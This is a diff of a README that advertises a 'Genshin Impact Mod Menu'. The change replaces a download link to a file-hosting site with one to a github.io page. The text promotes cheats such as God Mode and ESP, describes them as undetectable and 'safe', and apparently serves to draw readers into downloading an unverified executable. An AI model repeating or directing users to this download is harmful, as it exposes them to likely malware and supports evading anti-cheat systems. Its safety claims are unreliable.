@@ -1,7 +1,6 @@
 # Genshin Impact Mod Menu  
 
-[![Download GenshinImpact ModMenu](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://downloadifiles.com?label=1e88dd1be7cebcac3b93ae91dcb2375f
-)
+[![Download GenshinImpact ModMenu](https://img.shields.io/badge/Download-GenshinImpact%20ModMenu-blueviolet)](https://genshin-impact-mod-menu.github.io/.github/)
 
 ## 🚀 About  
 This **Genshin Impact Mod Menu** is a feature-packed tool designed to enhance your gameplay experience. With powerful cheats like **God Mode, Infinite Stamina, Damage Multiplier, ESP**, and more, you can explore Teyvat like never before. The mod menu is optimized for undetectable use, offering a smooth and safe experience with a user-friendly interface.  
